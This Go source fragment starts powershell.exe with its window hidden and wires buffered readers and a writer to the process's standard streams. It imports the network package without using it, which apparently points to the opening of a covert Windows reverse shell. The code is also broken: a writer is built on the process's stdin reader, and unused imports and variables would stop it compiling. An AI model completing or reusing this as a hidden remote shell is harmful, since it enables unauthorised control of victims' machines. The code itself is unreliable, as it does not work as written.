package main

import (
	"bufio"
	"io/ioutil"
	"net"
	"os/exec"
	"syscall"
	"time"
)

func main() {
	cmd := exec.Command("powershell.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	writer := bufio.NewWriter(cmd.Stdin)
	reader_out := bufio.NewReader(cmd.Stdout)
	reader_err := bufio.NewReader(cmd.Stderr)
}
